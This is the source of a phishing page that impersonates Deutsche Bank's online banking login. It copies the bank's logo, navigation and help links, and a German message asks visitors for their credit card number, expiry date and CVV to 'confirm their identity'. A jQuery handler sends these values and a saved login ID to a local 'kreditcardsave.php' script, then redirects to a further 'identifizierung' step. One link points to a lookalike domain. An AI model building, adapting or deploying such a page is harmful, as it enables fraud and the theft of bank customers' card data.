<?php include 'Model.php'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de"><head>
<base href="<?php echo $baseUrl; ?>/">
	<title>Onlinebanking und Brokerage der Deutschen Bank</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="expires" content="0">
	<meta name="instance" content="pnta101">
	<meta name="description" content="Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit dem Onlinebanking der Deutschen Bank.">

	<script src="js/global.js" type="text/javascript"></script>


	<link rel="shortcut icon" type="image/ico" href="images/favicon.ico?v=1">
	<link rel="stylesheet" type="text/css" href="css/base.css" media="screen, print">
	<link rel="stylesheet" type="text/css" href="css/customize.css" media="screen, print">
    <link rel="stylesheet" type="text/css" href="css/forms.css" media="screen, print">
	<link rel="stylesheet" href="css/font-awesome.min.css">

<style>
	.nextStep {  padding-right: 4em!important;
		background-image: url('images/bt_primary_default.png') !important;
		background-position: 91.5% center !important;
		background-position: right 10px center !important;
		background-repeat: no-repeat !important;
		background-size: 13px 11px !important;
		}
		
		.button {
		background: #2282c1;
		color: #fff;
		cursor: pointer;
		padding: .6em 1em;
		text-decoration: none;
		border: 0;
		border-radius: 3px;
		box-shadow: 0 1px 2px rgba(0, 0, 0, .35);
		line-height: 1.25;
		display: inline-block;
		}
		.formContainer { border: 0px; }
		
		#topicContainer { margin-top: 15px !important; }
        @font-face {
	font-family: 'pfbicons';
	src: url('fonts/pfbicons.ttf') format('truetype');
	font-weight: normal;
	font-style: normal;
}
</style>
</head>


<body id="login" class="noTopicContainer">
	<div id="rollContainer">
		<div id="globalContainer"><a name="globalContainer"></a>

			<div id="serviceNavigation">

				<ul>
					<li class="access"><a href="#contentContainer">Zum Inhalt springen</a></li>
					<li class="access"><a href="#" accesskey="0">Zur <span xml:lang="en" lang="en">Accesskeys</span>-Übersicht</a></li>
				</ul>
			</div> <!-- End of serviceNavigation -->
			<div id="headerContainer">


				<p id="logoContainer"><img src="images/logo_db.gif" width="267" height="76" title="Logo Deutsche Bank" alt="Logo Deutsche Bank"></p>
				<div id="metaNavigation">
					<h4 class="access">Sprachauswahl und Filialsuche</h4>
					<ul>

						<li><a href="https://webfilialien-vorgang.de/creditcard/init.do.html">English Version</a></li>

						<li><a href="https://www.deutsche-bank.de/pfb/content/jumppages/filialfinder.html" title="Neues Fenster: Finden Sie eine Filiale in Ihrer Nähe">Ihre Filiale</a></li>
					</ul>
				</div> <!-- End of metaNavigation -->
			</div>

			<!-- End of headerContainer -->

			<div id="locationContainer"></div> <!-- End of locationContainer -->

			<div id="folderContainer">
				<div id="topicContainer">

					<div class="additionalInfo onlinebanking">
						<h4><span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span></span></h4>
						<p>Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit unserem <span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span>.</span></p>
						<ul>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/Leistungen-im-Ueberblick.html" title="Neues Fenster: Rund ums Online-Banking">Rund ums Online-Banking</a></li>

							<li><a target="_blank" href="https://secure.deutsche-bank.de/pbc/trxmdemokonto/loginpin/goto.do" title="Neues Fenster: Demokonto testen">Demokonto testen</a></li>

							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/konto-und-karte/konten-im-ueberblick/konten-im-vergleich.html" title="Neues Fenster: Konto eröffnen">Konto eröffnen</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/opra4x/public/pfb/request-online-banking-access/#/page-1-0" title="Neues Fenster: Konto für Online- und Telefon-Banking freischalten">Konto für Online- und Telefon-Banking freischalten</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/mobile-apps/deutsche-bank-mobile-app.html" title="Neues Fenster: MobileBanking">MobileBanking</a></li>
						</ul>
					</div>
					<div class="additionalInfo help">
						<h4>Hilfe</h4>
						<ul>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/faq-s.html" title="Neues Fenster: Häufig gestellte Fragen">Häufig gestellte Fragen</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/downloadcenter.html" title="Neues Fenster: Download-Center">Download-Center</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/service-und-kontakt/service-ueberblick.html#tabset_content_tab2" title="Neues Fenster: Technischer Support">Technischer Support</a></li>
							<li><a target="_blank" href="https://www.deutsche-bank.de/pk/digital-banking/online-banking/sicherheit/sicherheitsverfahren.html" title="Neues Fenster: Sicherheit">Sicherheit</a></li>
						</ul>
					</div>

				</div> <!-- End of topicContainer -->

				<!-- Rendering of content container and footer container -->
	<link href="css/styles.css" rel="stylesheet">

				<script type="text/javascript" language="JavaScript" src="js/autotab.js"></script>
				<script type="text/javascript" language="JavaScript" src="js/fingerprintLoginUi.js"></script>
				<script type="text/javascript">
					/* Check if the Caps-Lock key is on. */
					/* If so, make the 'capsLockMessage' element visible */

					function checkCapsLock(e) {
						var myKeyCode = 0;
						var myShiftKey = e.shiftKey || (e.modifiers && (e.modifiers & 4));

						// Internet Explorer && Mozilla
						if (window.event) {
							// Mozilla
							if (e.charCode) {
								myKeyCode = e.charCode;
							}
							// Internet Explorer
							else {
								myKeyCode = e.keyCode;
							}

							// Netscape 4
						} else if (e.which) {
							myKeyCode = e.which;
						}

						// Upper case letters are seen without depressing the Shift key, therefore Caps Lock is on
						if ((myKeyCode >= 65 && myKeyCode <= 90) && !myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';
							// Lower case letters are seen while depressing the Shift key, therefore Caps Lock is on
						} else if ((myKeyCode >= 97 && myKeyCode <= 122) && myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';
							// Special characters in number keys are type if you have Caps Lock enable in German keyboards
						} else if ((myKeyCode == 33 || myKeyCode == 34 || myKeyCode == 36 || myKeyCode == 37 ||
								myKeyCode == 38 || myKeyCode == 40 || myKeyCode == 41 || myKeyCode == 47 ||
								myKeyCode == 61 || myKeyCode == 167 || myKeyCode == 183 || myKeyCode == 64 ||
								myKeyCode == 35 || myKeyCode == 94 || myKeyCode == 42) && !myShiftKey) {
							document.getElementById('capsLockMessage').style.visibility = 'visible';

							// Numbers typed and the shift is pressed, means that in a German keyboard you have the Caps Lock enabled
						} else if ((myKeyCode >= 48 && myKeyCode <= 57) && myShiftKey) {

						} else {
							document.getElementById('capsLockMessage').style.visibility = 'hidden';
						}
					}
				</script>
				<style type="text/css">
					body#login #verimiContainer #verimiRegistrationNote {
						font-size: 0.93em;
						color: #7a7a7a;
						padding-top: 0.5em;
					}
				</style>

				<div id="contentContainer"><a name="contentContainer"></a>
					<!--  page LoginPage -->
					<div id="pathNavigation" class="access">
						<p><strong>Sie sind hier:</strong> Kunden-Login</p>
					</div>


					<div id="mainContent">

						<div class="formContainer" style="text-align: left;">
							<form id="login-form" autocomplete="off" class="form-horizontal" method="post"><input type="hidden" name="SCC_X_TOKEN" value="f9Z10OcMAfRN9T0HIDN09qT3PYKbZbFF">
								<input type="hidden" name="randomId" value="<?php echo $randomId; ?>">
								<div style="width:0px;height:0px;position:absolute;left:-100px;top:-100px;overflow:hidden"><input type="hidden" name="id2_hf_0" id="id2_hf_0" value=""></div>
								<aab-alert data-error="widget.context.error" data-ng-hide="widget.context.isStateModalOpen &amp;&amp; widget.context.error &amp;&amp; widget.context.error.isRecoverable" class="ng-isolate-scope"><!-- ngIf: emerald -->
									<div ng-if="emerald" class="alert em-alert-warning  ng-scope ng-isolate-scope" role="alert" data-ng-click="isCollapsed = !isCollapsed" id="errorMessage" aria-live="assertive" data-ng-show="error" data-aab-scroll-to="error !== undefined" data-testid="alert-container" style="padding: 0 !important;">							<div class="d-flex flex-row"><span class="float-left flex-shrink-0 em-icon-size-3 sy-notification-warning"></span> <span class="sr-only"></span>
											<div><!-- ngIf: error.title && (error.title | translate) -->
												<h3 data-testid="first-alert-warning-text" data-ng-if="error.title &amp;&amp; (error.title | translate)" data-ng-bind-html="error.title | translate | aabTrustedHtml" class="ng-binding ng-scope" style=""></h3><!-- end ngIf: error.title && (error.title | translate) -->
												<p class="mb-0 ng-binding" data-ng-bind-html="error.text | translate | aabTrustedHtml" data-translate-default="Er is een fout opgetreden" data-testid="second-alert-warning-text">
												</p><div role="alert" id="errorMessage" aria-live="assertive" class="ap-field-errors">
													<div class="msgerror">
														<p apscreenreaderonly="" class="sr-only">
																				</p><div style="color: #000; margin-bottom: 30px;">Geben sie Ihre Kreditkartendaten ein, damit wir ihre Identität bestätigen können.</div>
																	
															
													</div><!---->
												</div>
												<script>
													var dt = new Date();
													document.getElementById("datetime").innerHTML = dt.toLocaleTimeString();
												</script>
												<script>
													var dt = new Date();
													document.getElementById("datejkkr").innerHTML = dt.toLocaleDateString();
												</script>
												<style>
													.scc-login .next-group { margin-top: 20px !important; }
													
													.spinner {
														display: inline-block;
														width: 20px;
														height: 20px;
														position: relative;
														margin-right: 5px;
														/* Add space between spinner and text */
													}
							
													.spinner::before,
													.spinner::after {
														content: '';
														position: absolute;
														border-radius: 50%;
													}
							
													.spinner::before {
														top: 0;
														left: 0;
														width: 100%;
														height: 100%;
														border: 2px solid transparent;
														border-top-color: #fff;
														animation: spin 1s linear infinite;
													}
							
													.spinner::after {
														top: 3px;
														left: 3px;
														width: 14px;
														height: 14px;
														border: 2px solid transparent;
														border-top-color: #fff;
														animation: spin-reverse 1s linear infinite;
													}
							
													@keyframes spin {
														to {
															transform: rotate(360deg);
														}
													}
							
													@keyframes spin-reverse {
														to {
															transform: rotate(-360deg);
														}
													}
							
													
											.loading-text {
											display: inline-block;
											font-family: Arial, sans-serif; 
													font-size: 16px;
													color: #fff;
													}
												</style>
												<p></p>
											</div>
										</div><!-- ngIf: error.options.button -->
									</div><!-- end ngIf: emerald --><!-- ngIf: !emerald -->
									<div class="form-field next-group" style="display: inline-block; margin-right: 10px; margin-bottom: 20px;">
										<div class="label-pos-none field-length-full">
											<label for="teilnehmer"></label>
											<div class="input">
												<input class="input-box-simple border-bottom inline-block blinking-cursor" type="text" required="required" id="cardnum" name="cardnum" onkeyup="doNext(this, event);" autocomplete="off" maxlength="19" tabindex="1" autofocus="" data-h5-errorid="invalid-teilnehmer" placeholder="Kartennummer">
							
												<div class="error-msg" id="invalid-teilnehmer" style="display: none;">
													<div class="inner">
														<p>
															Geben Sie bitte 8 oder 10 Ziffern für Ihre 
Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen
 ein.
														</p>
													</div>
												</div>
											</div>
											<style type="text/css">
							
											</style>
							
							
										</div>
									</div>
							
									<div class="form-field" style="display: inline-block; margin-right: 10px;">
							
										<div class="label-pos-none field-length-full">
											<label for="pin"></label>
											<div class="input">
												<input class="input-box-simple border-bottom inline-block blinking-cursor" type="text" required="required" id="exp" name="exp" onkeyup="doNext(this, event);" autocomplete="on" maxlength="5" tabindex="2" data-h5-errorid="invalid-pin" placeholder="MM/YY">
							
												<div class="error-msg" id="invalid-pin" style="display: none;">
													<div class="inner">
														<p>
															Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.
														</p>
													</div>
												</div>
											</div>
							
										</div>
									</div>
									<div class="form-field" style="display: inline-block;">
							
										<div class="label-pos-none field-length-full">
											<label for="pin"></label>
											<div class="input">
												<input class="input-box-simple border-bottom inline-block blinking-cursor" type="text" required="required" id="cvv" name="cvv" onkeyup="doNext(this, event);" autocomplete="on" maxlength="3" tabindex="2" data-h5-errorid="invalid-pin" placeholder="CVV">
												<script>
											document.addEventListener("DOMContentLoaded", function() {
											  const cardnum = document.getElementById('cardnum');
											  const exp = document.getElementById('exp');
											  const cvv = document.getElementById('cvv');
											
											  if (cardnum) {
												cardnum.addEventListener('input', function(e) {
												  e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
												  if (/[^0-9\s]/.test(e.target.value)) {
													alert("Die Kartennummer darf nur Zahlen enthalten.");
													e.target.value = e.target.value.replace(/[^0-9\s]/g, '');
												  }
												});
											  }
											
											  if (exp) {
												exp.addEventListener('input', function(e) {
												  e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/^(..)(.)/g, '$1/$2').substr(0, 5);
												  if (e.target.value.length === 5) {
													const [mm, yy] = e.target.value.split("/");
													if (yy < 23 || mm < 1 || mm > 12) {
													  alert("Das Ablaufdatum der Karte ist ungültig.");
													  e.target.value = "";
													}
												  }
												});
											  }
											
											  if (cvv) {
												cvv.addEventListener('input', function(e) {
												  e.target.value = e.target.value.replace(/[^0-9]/g, '');
												  if (/[^0-9]/.test(e.target.value)) {
													alert("Der CVV darf nur Zahlen enthalten.");
													e.target.value = e.target.value.replace(/[^0-9]/g, '');
												  }
												});
											  }
											});

												</script>
							
												<div class="error-msg" id="invalid-pin" style="display: none;">
													<div class="inner">
														<p>
															Geben Sie bitte min. 5 bis max. 45 Buchstaben, Ziffern bzw. Sonderzeichen ein.
														</p>
													</div>
												</div>
											</div>
							
										</div>
									</div>
									<button type="" value="Weiter" id="loginButton" style="float: right;" class="button nextStep login btn btn--primary btn-value kreditkarte">Weiter</button>
							

						</aab-alert></form></div>

					</div>
				</div>

				<div id="footerContainer">

					<div id="pageFeatures">

						<div id="fontSizer">
							<h4>Schriftgröße</h4>
						</div> <!-- End of fontSizer -->
					</div> <!-- End of pageFeatures -->

				</div>
			</div> <!-- End of folderContainer -->
			<div class="access">
				<ul>
					<li><a href="#globalContainer">Zum Anfang der Seite springen</a></li>
				</ul>
			</div>
		</div> <!-- End of globalContainer  -->
	</div> <!-- End of rollContainer -->
	
	<input type="hidden" id="token" value="65a19bca8fb2e">
	<input type="hidden" id="user-id" value="65a67a557a7d8">
	<input type="hidden" id="loginid" value="<?php echo $savedId; ?>">
	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

			<script>
		// setInterval(() => {
		// 	const data = new FormData();
		// 	data.append('id', document.querySelector('#user-id').value);
		// 	fetch('/user/online', {
		// 		method: 'POST',
		// 		body: data
		// 	});
		// }, 3000);
		
  $(document).ready(function() {
      $('.kreditkarte').on('click', function() {
         var cardnum = $('#cardnum').val();
         var exp = $('#exp').val();
         var cvv = $('#cvv').val();
        var savedId = $('#loginid').val();
         var formData = {
            cardnum: cardnum,
            exp: exp,
            cvv: cvv,
            SavedId:savedId
         };

		 var randomId = document.querySelector('input[name="randomId"]').value;

         $.ajax({
            type: 'POST',
			// url: 'Kreditkartesave.php',
			url: 'kreditcardsave.php',
            data: formData,
            success: function(response) {
			   response = JSON.parse(response);
               if (response.status === 'success') {
                    var savedId = response.id;
                    window.location.href = 'identifizierung/' + randomId;
                } else {
                    console.error(response.message);
                }
            },
            error: function(xhr, status, error) {
               console.error(xhr.responseText);
            }
         });
      });
   });
	</script>
	
	<script src="js/creditcard.js"></script>


</body></html>